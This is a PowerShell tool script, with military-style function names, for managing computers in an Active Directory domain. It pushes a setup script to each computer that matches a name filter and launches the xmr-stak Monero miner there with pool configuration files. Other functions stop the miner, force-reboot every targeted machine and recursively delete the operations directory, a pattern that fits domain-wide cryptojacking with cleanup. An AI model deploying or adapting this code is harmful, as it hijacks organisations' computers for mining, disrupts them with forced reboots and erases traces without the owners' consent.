# Global Varibles

$searchBase = New-Object System.Collections.Generic.List[System.Object]

# Main Functions

function fireBase ($outputPane,$progressBar) {

  $fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
  $missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
  $opsDir = $missionParameters.ops
  $filterTarget = $missionParameters.Target
  $advanceParty = $missionParameters.ap
  $searchbase = $missionParameters.search
  $hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name
  showFireBase $outputPane

  foreach ($client in $hostList.Name)

  {

    $counter++
    [int]$Percentage = ($counter / $hostList.count) * 100
    $ProgressBar.Value = $Percentage
    $outputPane.text += "Advance Party en-route to $client...`n"
    $cmdstring = "invoke-command -computername $client -FilePath $advanceParty -ArgumentList $opsDir"
    $scriptblock = [scriptblock]::Create($cmdstring)
    Start-Process powershell -ArgumentList "-command $Scriptblock"

  }

  $outputPane.text += "`n`nBASE ESTABLISHED!"

}

function fireMission ($outputPane,$progressBar) {

  $fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
  $missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
  $searchbase = $missionParameters.search
  $filterTarget = $missionParameters.Target
  $opsDir = $missionParameters.ops
  $hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name
  showFireMission $outputPane
  foreach ($client in $hostList.Name)

  {

    $counter++
    [int]$Percentage = ($counter / $hostList.count) * 100
    $ProgressBar.Value = $Percentage
    $outputPane.text += "$client - Firing...`n"
    $cmdstring = "invoke-command -computername $client -scriptblock {write-host 'I am' $client ; & ‘$opsDir\xmr-stak-win64-2.8.2\xmr-stak.exe’ -c '$opsDir\xmr-stak-win64-2.8.2\config.txt' -C '$opsDir\xmr-stak-win64-2.8.2\pools.txt' --cpu '$opsDir\xmr-stak-win64-2.8.2\cpu.txt' --amd '$opsDir\xmr-stak-win64-2.8.2\amd.txt' --nvidia '$opsDir\xmr-stak-win64-2.8.2\nvidia.txt'}"
    $scriptBlock = [scriptblock]::Create($cmdstring)
    Start-Process powershell -ArgumentList "-command  $Scriptblock"

  }

  $outputPane.text += "`n`nFIRE FOR EFFECT!"

}

function ceaseFire ($outputPane,$progressBar) {

  $fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
  $missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
  $searchbase = $missionParameters.search
  $filterTarget = $missionParameters.Target
  #$opsDir = $missionParameters.ops
  $hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name
  showCeaseFire $outputPane

  foreach ($client in $hostList.Name)

  {

    $counter++
    [int]$Percentage = ($counter / $hostList.count) * 100
    $ProgressBar.Value = $Percentage
    $outputPane.text += "$client - Clearing Breach...`n"
    $cmdstring = "Invoke-Command -ComputerName $client -ErrorAction Continue -ScriptBlock { Stop-Process -Name xmr-stak }"
    $scriptblock = [scriptblock]::Create($cmdstring)
    Start-Process powershell -ArgumentList "-command  $Scriptblock"

  }

  $outputPane.text += "`n`nBREACHES CLEAR!"

}

function cycleGunline ($outputPane,$progressBar) {

  $fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
  $missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
  $filterTarget = $missionParameters.Target
  $searchbase = $missionParameters.search
  $hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name
  showCycleGunline $outputPane

  foreach ($client in $hostList.Name)

  {

    $counter++
    [int]$Percentage = ($counter / $hostList.count) * 100
    $ProgressBar.Value = $Percentage
    $outputPane.text += "Sending command to $client...`n"
    Invoke-Command $client -ErrorAction Continue -ScriptBlock { Restart-Computer -Force }


  }

  $outputPane.text += "`n`nGUNLINE CYCLED!"

}

function getGrid ($outputPane) {

  $fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
  $missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
  $outputPane.text += "MISSION PARAMETERS:`n`n"
  $outputPane.text += "Organizational Unit(s): "
  $outputPane.text += $missionParameters.search.Name
  $outputPane.text += "`n`nSearch Base(s): "
  $outputPane.text += $missionParameters.search.distinguishedname
  $outputPane.text += "`n`nTarget Filter String: "
  $outputPane.text += $missionParameters.Target
  $outputPane.text += "`n`nOperations Directory: "
  $outputPane.text += $missionParameters.ops
  $outputPane.text += "`n`nPayload: "
  $outputPane.text += $missionParameters.payload
  $outputPane.text += "`n`nAdvance Party: "
  $outputPane.text += $missionParameters.ap

}

function setGrid ($outputPane,$textBox_filter,$textBox_OpsDir) {

  $filterTarget = $textBox_filter.text
  $opsDir = $textBox_OpsDir.text
  $configPath = "${psscriptroot}\fireDirectionalControl.json"
  $advanceParty = "${psscriptroot}\advanceParty.ps1"
  $storedSettings = @{

    ops = $opsDir
    payload = $opsDir
    ap = $advanceParty
    Target = $filterTarget
    search = $searchBase

  }
  $storedSettings | ConvertTo-Json | Out-File $configPath
  showRedLeg $outputPane
  $outputPane.text += "`n`nGrid Coordinates Set!"
  Start-Sleep -s 3
  showRedLeg $outputpane
  reconGrid $outputpane

}

function pushGrid ($outputPane,$textBox_OU) {

  [string]$searchString = $textBox_OU.text
  $selection = Get-ADObject -Filter "Name -eq '$searchString'" | Where-Object { $_.objectclass -eq 'organizationalunit' } | Select-Object Name,DistinguishedName
  if (!($searchBase -match $selection)) { $searchBase.Add($selection) }
  showGridCheck $outputpane
  $outputPane.text += "Current Search Base Values:`n"
  $outputPane.text += $searchBase | Format-Table | Out-String

}

function popGrid ($outputPane,$textBox_OU) {


  $searchBase.RemoveAt($searchBase.count - 1)
  showGridCheck $outputpane
  $outputPane.text += "Current Search Base Values:`n"
  $outputPane.text += $searchBase | Format-Table | Out-String

}

function clearGrid ($outputPane) {

  $searchBase.Clear()
  showRedLeg $outputpane
  $outputPane.text += "`nSearchBase is CLEAR!"
  Start-Sleep -s 3
  showRedLeg $outputpane
  reconGrid $outputpane

}

function moveOut ($outputPane,$progressBar) {

  $fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
  $missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
  $searchbase = $missionParameters.search
  $filterTarget = $missionParameters.Target
  $opsDir = $missionParameters.ops
  $hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name
  showMoveOut $outputPane

  foreach ($client in $hostList.Name)

  {

    $counter++
    [int]$Percentage = ($counter / $hostList.count) * 100
    $ProgressBar.Value = $Percentage
    $outputPane.text += "$client - Moving Out...`n"
    $cmdstring = “invoke-command -computername $client -scriptblock { If(test-path $opsDir) { Remove-Item -path $opsDir -Recurse -Force }}”
    $scriptblock = [scriptblock]::Create($cmdstring)
    Start-Process powershell -ArgumentList "-command $Scriptblock"

  }

  $outputPane.text += "`n`nGUNLINE OUT!"

}